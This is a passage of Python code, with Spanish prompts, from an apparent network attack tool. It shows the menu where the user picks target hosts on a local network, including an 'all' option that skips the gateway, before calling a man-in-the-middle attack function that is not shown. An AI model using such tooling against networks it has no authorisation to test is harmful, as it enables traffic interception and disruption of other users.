                print(f"{ERROR_COLOR}Escanéa la red (Opción 1) primero para seleccionar objetivos.{Style.RESET_ALL}")
                continue
                
            print("\n")
            
            # Bucle de selección de hosts
            while True:
                ip_o_num = input(f"{ACCENT_COLOR}Indica el(los) **Objetivo(s)**: ID(s) (ej: 1,3), IP (ej: 192.168.1.44), 'manual', o 'all': {Style.RESET_ALL}").strip().lower()
                
                ips_objetivo = []
                
                # Opción para atacar a todos
                if ip_o_num == 'all' or ip_o_num == 'block all':
                 
                    # Filtra el gateway
                    ips_objetivo = [h['ip'] for h in hosts_descubiertos if h['hostname'] != '_gateway']
                    if not ips_objetivo:
                        print(f"{ERROR_COLOR}No hay hosts no-gateway disponibles.{Style.RESET_ALL}")
                        continue
       
                    print(f"{ACCENT_COLOR}Todos los hosts seleccionados para el ataque.{Style.RESET_ALL}")
                    break
             
                # Opción manual
                elif ip_o_num == 'manual':
                    ip = input(f"{ACCENT_COLOR} IP objetivo manual: {Style.RESET_ALL}").strip()
                    ips_objetivo.append(ip)
                    break
            
                # Procesamiento de IDs y/o IPs
                try:
                    partes = ip_o_num.split(',')
                    valido = True
            
                    for parte in partes:
                        parte = parte.strip()
                        if parte.isdigit():
                            host_id = int(parte)
                            if 0 <= host_id < len(hosts_descubiertos):
                                ips_objetivo.append(hosts_descubiertos[host_id]['ip'])
                            else:
                                print(f"{ERROR_COLOR}ID '{parte}' fuera de rango.{Style.RESET_ALL}")
                                valido = False
                                break
                        elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', parte):
                            ips_objetivo.append(parte)
                        else:
                            print(f"{ERROR_COLOR}Entrada no válida: '{parte}'.\nInténtalo de nuevo.{Style.RESET_ALL}")
                            valido = False
                            break

                    if valido and ips_objetivo:
                        ips_objetivo = list(set(ips_objetivo))
                        break
                    elif valido and not ips_objetivo:
                        print(f"{ERROR_COLOR}No se ingresó ninguna IP válida.{Style.RESET_ALL}")

                except Exception:
                    print(f"{ERROR_COLOR}Error al procesar la entrada. Inténtalo de nuevo.{Style.RESET_ALL}")

           # Si se seleccionaron objetivos, salimos del menú principal para ir al módulo de ataque
            if ips_objetivo:
                # ---> LLAMADA A LA FUNCIÓN DE ATAQUE PRINCIPAL <---
                iniciar_ataque_mitm(interfaz, ips_objetivo, hosts_descubiertos)
                # Si el ataque termina, volvemos al menú
                break 
            
        elif accion == "3" or accion.lower() == "salir":
            print(f"{ACCENT_COLOR}Saliendo...{Style.RESET_ALL}")
            sys.exit(0)
     
        else:
            print(f"{ERROR_COLOR}Opción no válida.{Style.RESET_ALL}")
